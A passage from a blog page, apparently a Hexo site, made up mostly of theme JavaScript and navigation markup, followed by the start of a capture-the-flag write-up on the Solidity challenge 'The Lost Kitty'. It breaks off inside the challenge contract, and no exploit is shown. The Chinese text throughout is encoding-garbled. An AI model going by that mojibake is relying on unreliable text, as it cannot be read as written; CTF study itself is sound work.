          this.list.splice(index,1);
        }
      }
    }
    // æ„é€ ä¸€ä¸ªå¯ä»¥runçš„å¯¹è±¡
    function Item(fn, name) {
      // å‡½æ•°åç§°
      this.name = name || fn.name;
      // runæ–¹æ³•
      this.run = () => {
        try {
          fn()
        } catch (error) {
          console.log(error);
        }
      };
    }
  }
  /******************** Pjax ********************************/
  // /layout/_plugins/pjax/index.ejs
  // volantis.pjax.send(callBack[,"callBackName"]) ä¼ å…¥pjax:sendå›è°ƒå‡½æ•°
  // volantis.pjax.push(callBack[,"callBackName"]) ä¼ å…¥pjax:completeå›è°ƒå‡½æ•°
  // volantis.pjax.error(callBack[,"callBackName"]) ä¼ å…¥pjax:errorå›è°ƒå‡½æ•°
  volantis.pjax = {};
  volantis.pjax.method = {
    complete: new RunItem(),
    error: new RunItem(),
    send: new RunItem(),
  };
  volantis.pjax = Object.assign(volantis.pjax, {
    push: volantis.pjax.method.complete.push,
    error: volantis.pjax.method.error.push,
    send: volantis.pjax.method.send.push,
  });
  /******************** RightMenu ********************************/
  // volantis.rightmenu.handle(callBack[,"callBackName"]) å¤–éƒ¨èœå•é¡¹æ§åˆ¶
  // å¯åœ¨ volantis.mouseEvent å¤„è·å–å³é”®äº‹ä»¶
  volantis.rightmenu = {};
  volantis.rightmenu.method = {
    handle: new RunItem(),
  }
  volantis.rightmenu = Object.assign(volantis.rightmenu, {
    handle: volantis.rightmenu.method.handle.push,
  });
  /********************  Dark Mode  ********************************/
  // /layout/_partial/scripts/darkmode.ejs
  // volantis.dark.mode å½“å‰æ¨¡å¼ dark or light
  // volantis.dark.toggle() æš—é»‘æ¨¡å¼è§¦å‘å™¨
  // volantis.dark.push(callBack[,"callBackName"]) ä¼ å…¥è§¦å‘å™¨å›è°ƒå‡½æ•°
  volantis.dark = {};
  volantis.dark.method = {
    toggle: new RunItem(),
  };
  volantis.dark = Object.assign(volantis.dark, {
    push: volantis.dark.method.toggle.push,
  });
  /********************  Message  ********************************/
  // VolantisApp.message
  /********************  isMobile  ********************************/
  // /source/js/app.js
  // volantis.isMobile
  // volantis.isMobileOld
  /********************è„šæœ¬åŠ¨æ€åŠ è½½å‡½æ•°********************************/
  // volantis.js(src, cb)  cb å¯ä»¥ä¼ å…¥onloadå›è°ƒå‡½æ•° æˆ–è€… JSONå¯¹è±¡ ä¾‹å¦‚: volantis.js("src", ()=>{}) æˆ– volantis.js("src", {defer:true,onload:()=>{}})
  // volantis.css(src)

  // è¿”å›Promiseå¯¹è±¡ï¼Œå¦‚ä¸‹æ–¹æ³•åŒæ­¥åŠ è½½èµ„æºï¼Œè¿™åˆ©äºå¤„ç†æ–‡ä»¶èµ„æºä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œä¾‹å¦‚ï¼šAPlayer éœ€è¦åœ¨ MetingJS ä¹‹å‰åŠ è½½
  // (async () => {
  //     await volantis.js("...theme.plugins.aplayer.js.aplayer...")
  //     await volantis.js("...theme.plugins.aplayer.js.meting...")
  // })();

  // å·²ç»åŠ å…¥äº†setTimeout
  volantis.js = (src, cb) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        if (cb) {
          if (JSON.stringify(cb)) {
            for (let p in cb) {
              if (p == "onload") {
                script[p] = () => {
                  cb[p]()
                  resolve()
                }
              } else {
                script[p] = cb[p]
                script.onload = resolve
              }
            }
          } else {
            script.onload = () => {
              cb()
              resolve()
            };
          }
        } else {
          script.onload = resolve
        }
        script.setAttribute("src", src);
        HEAD.appendChild(script);
      });
    });
  }
  volantis.css = (src) => {
    return new Promise(resolve => {
      setTimeout(function () {
        var link = document.createElement('link');
        link.rel = "stylesheet";
        link.href = src;
        link.onload = resolve;
        document.getElementsByTagName("head")[0].appendChild(link);
      });
    });
  }
  /********************æŒ‰éœ€åŠ è½½çš„æ’ä»¶********************************/
  // volantis.import.jQuery().then(()=>{})
  volantis.import = {
    jQuery: () => {
      if (typeof jQuery == "undefined") {
        return volantis.js("https://unpkg.com/volantis-static@0.0.1654736714924/libs/jquery/dist/jquery.min.js")
      } else {
        return new Promise(resolve => {
          resolve()
        });
      }
    }
  }
  /********************** requestAnimationFrame ********************************/
  // 1ã€requestAnimationFrame ä¼šæŠŠæ¯ä¸€å¸§ä¸­çš„æ‰€æœ‰ DOM æ“ä½œé›†ä¸­èµ·æ¥ï¼Œåœ¨ä¸€æ¬¡é‡ç»˜æˆ–å›æµä¸­å°±å®Œæˆï¼Œå¹¶ä¸”é‡ç»˜æˆ–å›æµçš„æ—¶é—´é—´éš”ç´§ç´§è·Ÿéšæµè§ˆå™¨çš„åˆ·æ–°é¢‘ç‡ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªé¢‘ç‡ä¸ºæ¯ç§’60å¸§ã€‚
  // 2ã€åœ¨éšè—æˆ–ä¸å¯è§çš„å…ƒç´ ä¸­ï¼ŒrequestAnimationFrame å°†ä¸ä¼šè¿›è¡Œé‡ç»˜æˆ–å›æµï¼Œè¿™å½“ç„¶å°±æ„å‘³ç€æ›´å°‘çš„çš„ cpuï¼Œgpu å’Œå†…å­˜ä½¿ç”¨é‡ã€‚
  volantis.requestAnimationFrame = (fn)=>{
    if (!window.requestAnimationFrame) {
      window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
    }
    window.requestAnimationFrame(fn)
  }
  /************************ layoutHelper *****************************************/
  volantis.layoutHelper = (helper, html, opt)=>{
    opt = Object.assign({clean:false, pjax:true}, opt)
    function myhelper(helper, html, clean) {
      volantis.tempDiv = document.createElement("div");
      volantis.tempDiv.innerHTML = html;
      let layoutHelper = document.querySelector("#layoutHelper-"+helper)
      if (layoutHelper) {
        if (clean) {
          layoutHelper.innerHTML = ""
        }
        layoutHelper.append(volantis.tempDiv);
      }
    }
    myhelper(helper, html, opt.clean)
    if (opt.pjax) {
      volantis.pjax.push(()=>{
        myhelper(helper, html, opt.clean)
      },"layoutHelper-"+helper)
    }
  }
  /****************************** æ»šåŠ¨äº‹ä»¶å¤„ç† ****************************************/
  volantis.scroll = {
    engine: new RunItem(),
    unengine: new RunItem(),
  };
  volantis.scroll = Object.assign(volantis.scroll, {
    push: volantis.scroll.engine.push,
  });
  // æ»šåŠ¨æ¡è·ç¦»é¡¶éƒ¨çš„è·ç¦»
  volantis.scroll.getScrollTop = () =>{
    let scrollPos;
    if (window.pageYOffset) {
      scrollPos = window.pageYOffset;
    } else if (document.compatMode && document.compatMode != 'BackCompat') {
      scrollPos = document.documentElement.scrollTop;
    } else if (document.body) {
      scrollPos = document.body.scrollTop;
    }
    return scrollPos;
  }
  // ä½¿ç”¨ requestAnimationFrame å¤„ç†æ»šåŠ¨äº‹ä»¶
  // `volantis.scroll.del` ä¸­å­˜å‚¨äº†ä¸€ä¸ªæ•°å€¼, è¯¥æ•°å€¼æ£€æµ‹ä¸€å®šæ—¶é—´é—´éš”å†…æ»šåŠ¨æ¡æ»šåŠ¨çš„ä½ç§», æ•°å€¼çš„æ£€æµ‹é¢‘ç‡æ˜¯æµè§ˆå™¨çš„åˆ·æ–°é¢‘ç‡. æ•°å€¼ä¸ºæ­£æ•°æ—¶, è¡¨ç¤ºå‘ä¸‹æ»šåŠ¨. æ•°å€¼ä¸ºè´Ÿæ•°æ—¶, è¡¨ç¤ºå‘ä¸Šæ»šåŠ¨.
  volantis.scroll.handleScrollEvents = () => {
    volantis.scroll.lastScrollTop = volantis.scroll.getScrollTop()
    function loop() {
      const scrollTop = volantis.scroll.getScrollTop();
      if (volantis.scroll.lastScrollTop !== scrollTop) {
        volantis.scroll.del = scrollTop - volantis.scroll.lastScrollTop;
        volantis.scroll.lastScrollTop = scrollTop;
        // if (volantis.scroll.del > 0) {
        //   console.log("å‘ä¸‹æ»šåŠ¨");
        // } else {
        //   console.log("å‘ä¸Šæ»šåŠ¨");
        // }
        // æ³¨é”€è¿‡æœŸçš„unengineæœªæ»šåŠ¨äº‹ä»¶
        volantis.scroll.unengine.list=[]
        volantis.scroll.engine.start();
      }else{
        volantis.scroll.unengine.start();
      }
      volantis.requestAnimationFrame(loop)
    }
    volantis.requestAnimationFrame(loop)
  }
  volantis.scroll.handleScrollEvents()
  volantis.scroll.ele = null;
  // è§¦å‘é¡µé¢æ»šåŠ¨è‡³ç›®æ ‡å…ƒç´ ä½ç½®
  volantis.scroll.to = (ele, option = {}) => {
    if (!ele) return;
    volantis.scroll.ele = ele;
    // é»˜è®¤é…ç½®
    opt = {
      top: ele.getBoundingClientRect().top + document.documentElement.scrollTop,
      behavior: "smooth"
    }
    // å®šä¹‰é…ç½®
    if ("top" in option) {
      opt.top = option.top
    }
    if ("behavior" in option) {
      opt.behavior = option.behavior
    }
    if ("addTop" in option) {
      opt.top += option.addTop
    }
    if (!("observerDic" in option)) {
      option.observerDic = 100
    }
    // æ»šåŠ¨
    window.scrollTo(opt);
    // ç›‘è§†å™¨
    // ç›‘è§†å¹¶çŸ«æ­£å…ƒç´ æ»šåŠ¨åˆ°æŒ‡å®šä½ç½®
    // ç”¨äºå¤„ç† lazyload å¼•èµ·çš„ cls å¯¼è‡´çš„å®šä½å¤±è´¥é—®é¢˜
    // option.observer = false
    if (option.observer) {
      setTimeout(() => {
        if (volantis.scroll.ele != ele) {
          return
        }
        volantis.scroll.unengine.push(() => {
          let me = ele.getBoundingClientRect().top
          if(!(me >= -option.observerDic && me <= option.observerDic)){
            volantis.scroll.to(ele, option)
          }
          volantis.scroll.unengine.remove("unengineObserver")
        },"unengineObserver")
      },1000)
    }
  }
  /********************** Content Visibility ********************************/
  // è§ source/css/first.styl å¦‚æœé‡åˆ°ä»»ä½•é—®é¢˜ åˆ é™¤ .post-story å³å¯
  // ä¸€ä¸ªå…ƒç´ è¢«å£°æ˜ content-visibility å±æ€§å å¦‚æœå…ƒç´ ä¸åœ¨ viewport ä¸­ æµè§ˆå™¨ä¸ä¼šè®¡ç®—å…¶åä»£å…ƒç´ æ ·å¼å’Œå±æ€§ ä»è€ŒèŠ‚çœ Style & Layout è€—æ—¶
  // content-visibility çš„å‰¯ä½œç”¨: é”šç‚¹å¤±æ•ˆ ç­‰ç­‰(å®éªŒåˆæœŸ æš‚ä¸æ˜ç¡®), ä½¿ç”¨æ­¤æ–¹æ³•æ¸…é™¤æ ·å¼
  volantis.cleanContentVisibility = ()=>{
    if (document.querySelector(".post-story")) {
      console.log("cleanContentVisibility");
      document.querySelectorAll(".post-story").forEach(e=>{
        e.classList.remove("post-story")
      })
    }
  }
  /******************************************************************************/
  /******************************************************************************/
  /******************************************************************************/
  //å›¾åƒåŠ è½½å‡ºé”™æ—¶çš„å¤„ç†
  function errorImgAvatar(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg";
    img.onerror = null;
  }
  function errorImgCover(img) {
    img.src = "https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg";
    img.onerror = null;
  }
  /******************************************************************************/
</script>

  <!-- import head_end begin -->
  <!-- import head_end end -->
  <!-- Custom Files headEnd begin-->
  
  <!-- Custom Files headEnd end-->
  <!-- front-matter head_end begin -->
  <!-- front-matter head_end end -->
</head>
  <body itemscope itemtype="http://schema.org/WebPage">
    <!-- import body_begin begin-->
    <!-- import body_begin end-->
    <!-- Custom Files bodyBegin begin-->
    
    <!-- Custom Files bodyBegin end-->
    <!-- front-matter body_begin begin -->
    <!-- front-matter body_begin end -->
    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
        <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self"  href="/" onclick="return false;" title="comment"></a></li>
        
          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self"  href="/" onclick="return false;" title="toc"></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
            <img no-lazy class='logo' src='https://s1.vika.cn/space/2023/08/15/bbfac9a4142e4e75871222169d8d34cb'/>
          
          
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/" title="Home"
                  
                  
                  
                    active-action="action-home"
                  >
                  <i class='fa-solid fa-house fa-fw'></i>Home
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/" title="Categories"
                  
                  
                  
                    active-action="action-categories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>Categories
                </a>
                
                  <ul class="list-v">
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Solidity/" title="Solidity"
                  
                  
                  
                    active-action="action-categoriesSolidity"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Solidity
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Ethers-js/" title="Ethersjs"
                  
                  
                  
                    active-action="action-categoriesEthers-js"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Ethersjs
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Web3/" title="Web3"
                  
                  
                  
                    active-action="action-categoriesWeb3"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Web3
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Hexo/" title="Hexo"
                  
                  
                  
                    active-action="action-categoriesHexo"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Hexo
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Smart-contracts/" title="Smart-contracts"
                  
                  
                  
                    active-action="action-categoriesSmart-contracts"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Smart-contracts
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Python/" title="Python"
                  
                  
                  
                    active-action="action-categoriesPython"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Python
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Hardhat/" title="Hardhat"
                  
                  
                  
                    active-action="action-categoriesHardhat"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Hardhat
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Foundry/" title="Foundry"
                  
                  
                  
                    active-action="action-categoriesFoundry"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Foundry
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Knowledge-literacy/" title="Knowledge literacy"
                  
                  
                  
                    active-action="action-categoriesKnowledge-literacy"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Knowledge literacy
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Foundry/" title="Foundry"
                  
                  
                  
                    active-action="action-categoriesFoundry"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Foundry
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/PoC/" title="PoC"
                  
                  
                  
                    active-action="action-categoriesPoC"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>PoC
                </a>
                
              </li>
            
          
                    
                  </ul>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/archives/" title="Archives"
                  
                  
                  
                    active-action="action-archives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>Archives
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/about/" title="About"
                  
                  
                  
                    active-action="action-about"
                  >
                  <i class='fa-solid fa-user fa-fw'></i>About
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                 href="/" onclick="return false;" title="More"
                  
                  
                  >
                  <i class='fa-solid fa-bars fa-fw'></i>More
                </a>
                
                  <ul class="list-v">
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/tags/" title="Tags"
                  
                  
                  
                    active-action="action-tags"
                  >
                  <i class='fa-solid fa-tags fa-fw'></i>Tags
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/friends/" title="Friends"
                  
                  
                  
                    active-action="action-friends"
                  >
                  <i class='fa-solid fa-link fa-fw'></i>Friends
                </a>
                
              </li>
            
          
                    
                  </ul>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box header toggle-mode-btn">
                  <i class='fa-solid fa-lightbulb fa-fw'></i>Light
                </a>
              <li>
            
          
          
				</ul>
			</div>
      
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fa-solid fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="search..." />
        </form>
      </div>
      

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fa-solid fa-search fa-fw" target="_self" href="/" onclick="return false;" title="search"></a></li>
				
				<li>
          <a class="s-menu fa-solid fa-bars fa-fw" target="_self" href="/" onclick="return false;" title="menu"></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/" title="Home"
                  
                  
                  
                    active-action="action-home"
                  >
                  <i class='fa-solid fa-house fa-fw'></i>Home
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/" title="Categories"
                  
                  
                  
                    active-action="action-categories"
                  >
                  <i class='fa-solid fa-folder-open fa-fw'></i>Categories
                </a>
                
                  <ul class="list-v">
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Solidity/" title="Solidity"
                  
                  
                  
                    active-action="action-categoriesSolidity"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Solidity
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Ethers-js/" title="Ethersjs"
                  
                  
                  
                    active-action="action-categoriesEthers-js"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Ethersjs
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Web3/" title="Web3"
                  
                  
                  
                    active-action="action-categoriesWeb3"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Web3
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Hexo/" title="Hexo"
                  
                  
                  
                    active-action="action-categoriesHexo"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Hexo
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Smart-contracts/" title="Smart-contracts"
                  
                  
                  
                    active-action="action-categoriesSmart-contracts"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Smart-contracts
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Python/" title="Python"
                  
                  
                  
                    active-action="action-categoriesPython"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Python
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Hardhat/" title="Hardhat"
                  
                  
                  
                    active-action="action-categoriesHardhat"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Hardhat
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Foundry/" title="Foundry"
                  
                  
                  
                    active-action="action-categoriesFoundry"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Foundry
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Knowledge-literacy/" title="Knowledge literacy"
                  
                  
                  
                    active-action="action-categoriesKnowledge-literacy"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Knowledge literacy
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/Foundry/" title="Foundry"
                  
                  
                  
                    active-action="action-categoriesFoundry"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>Foundry
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/categories/PoC/" title="PoC"
                  
                  
                  
                    active-action="action-categoriesPoC"
                  >
                  <i class='fa-solid fa-book fa-fw'></i>PoC
                </a>
                
              </li>
            
          
                    
                  </ul>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/archives/" title="Archives"
                  
                  
                  
                    active-action="action-archives"
                  >
                  <i class='fa-solid fa-archive fa-fw'></i>Archives
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/about/" title="About"
                  
                  
                  
                    active-action="action-about"
                  >
                  <i class='fa-solid fa-user fa-fw'></i>About
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                 href="/" onclick="return false;" title="More"
                  
                  
                  >
                  <i class='fa-solid fa-bars fa-fw'></i>More
                </a>
                
                  <ul class="list-v">
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/tags/" title="Tags"
                  
                  
                  
                    active-action="action-tags"
                  >
                  <i class='fa-solid fa-tags fa-fw'></i>Tags
                </a>
                
              </li>
            
          
                    
                      
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover"
                href="/friends/" title="Friends"
                  
                  
                  
                    active-action="action-friends"
                  >
                  <i class='fa-solid fa-link fa-fw'></i>Friends
                </a>
                
              </li>
            
          
                    
                  </ul>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box header toggle-mode-btn">
                  <i class='fa-solid fa-lightbulb fa-fw'></i>Light
                </a>
              <li>
            
          
            
          </ul>
        </li>
			</ul>

      <!-- Custom Files header begin -->
      
      <!-- Custom Files header end -->
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
      <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
      <div id="none" class='cover-wrapper post search' style="display: none;">
        
  <div class='cover-bg' style='background-image:url(https://s1.vika.cn/space/2024/03/05/d91724ba519c41dfb5654ad89957afc3)'></div>

<div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">ä¸€åˆ†è€•è€˜ä¸€åˆ†æ”¶è·</p>
    
    
  </div>
  <div class='bottom'>
    
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <input type="text" class="input u-search-input" placeholder="search..." />
          <i class="icon fa-solid fa-search fa-fw"></i>
        </form>
      </div>
    
    <div class='menu navigation'>
      <div class='list-h'>
        
          
            <a href="/"
              
              
              active-action="action-home">
              <i class='fa-solid fa-house fa-fw'></i><p>ä¸»é¡µ</p>
            </a>
          
            <a href="/categories/"
              
              
              active-action="action-categories">
              <i class='fa-solid fa-folder-open fa-fw'></i><p>åˆ†ç±»</p>
            </a>
          
            <a href="/informal%20essay/"
              
              
              active-action="action-informal20essay">
              <i class='fa-solid fa-pen fa-fw'></i><p>éšç¬”</p>
            </a>
          
            <a href="/collectings/"
              
              
              active-action="action-collectings">
              <i class='fa-solid fa-book fa-fw'></i><p>å½’æ¡ˆ</p>
            </a>
          
            <a href="/archives/"
              
              
              active-action="action-archives">
              <i class='fa-solid fa-clipboard fa-fw'></i><p>æ–‡ç« </p>
            </a>
          
            <a target="_blank" rel="noopener" href="https://github.com/LBiyou/LBiyou.github.io"
              
              
              active-action="action-https:githubcomLBiyouLBiyougithubio">
              <i class='fab fa-github fa-fw'></i><p>æºç </p>
            </a>
          
        
      </div>
    </div>
  </div>
</div>

        <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
      </div>
    
  
</div>

      <div id="safearea">
        <div class="body-wrapper">
          
<div id="l_main" class=''>
  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
  <link itemprop="mainEntityOfPage" href="https://biyouqiuqiu.com/2023/09/01/Smart contracts/CTFProtocol/CTFProtocol/">
  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="BY_DLIFEğŸ‰">
  </span>
  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
    <meta itemprop="name" content="BY_DLIFEğŸ‰">
    <meta itemprop="description" content="Self-Discipline">
  </span>
  


  
    <span hidden>
      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
    </span>
  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title" itemprop="name headline">
        CTFProtocol-2022ï¼ˆ11ï¼‰
      </h1>
      <div class='new-meta-box'>
        
          
            
<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
  <a itemprop="url" class='author' href="/" rel="nofollow">
    <img itemprop="image" src="https://s1.vika.cn/space/2023/08/15/bbfac9a4142e4e75871222169d8d34cb">
    <p itemprop="name">BY_DLIFEğŸ‰</p>
  </a>
</div>

          
        
          
            
  <div class="new-meta-item wordcount">
    <a class='notlink'>
      <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
      <p>å­—æ•°ï¼š7.2k å­—</p>
    </a>
  </div>
  <div class="new-meta-item readtime">
    <a class='notlink'>
      <i class="fa-solid fa-bell fa-fw" aria-hidden="true"></i>
      <p>æ—¶é•¿ï¼š39 åˆ†é’Ÿ</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-09-01T12:50:10+08:00">
  <a class='notlink'>
    <i class="fa-solid fa-pen fa-fw" aria-hidden="true"></i>
    <p>å‘å¸ƒäºï¼š2023å¹´9æœˆ1æ—¥</p>
  </a>
</div>

          
        
          
            


<div class="new-meta-item browse">
  <a class='notlink'>
    <p>
      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
      
      <span id="busuanzi_value_page_pv"><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span>
      
      <span>æ¬¡æµè§ˆ</span>
    </p>
  </a>
</div>


          
        
        <!-- Custom Files topMeta begin-->
        
        <!-- Custom Files topMeta end-->
      </div>
    
  </div>


  <div id="layoutHelper-page-plugins"></div>
  <div id="post-body" itemprop="articleBody">
    <p><em><strong>ç”±ç®€å…¥éš¾</strong></em></p>
<h3 id="The-Lost-Kitty"><a href="#The-Lost-Kitty" class="headerlink" title="The Lost Kitty"></a>The Lost Kitty</h3><h4 id="1-question"><a href="#1-question" class="headerlink" title="1. question"></a>1. question</h4><blockquote>
<p>Lucas is a scientist who lives with his cat in a big house that has 2^256 rooms. His cat likes to play hide and seek and jumps to a random room whenever it hears a door opening in another one. Can you find Lucasâ€™ cat? Set the variable <code>catFound</code> to <code>true</code> to win this challenge.</p>
</blockquote>
<p><strong>æºç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/// @title The Lost Kitty</span><br><span class="line">/// @author https://twitter.com/Cryptonicle1</span><br><span class="line">/// @notice Lucas is a scientist who has lost his cat in a big house that has 2^256 rooms, anon can you find it?</span><br><span class="line">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hidden-kittycat</span><br><span class="line">contract HiddenKittyCat &#123;</span><br><span class="line">    address private immutable _owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">        bytes32 slot = 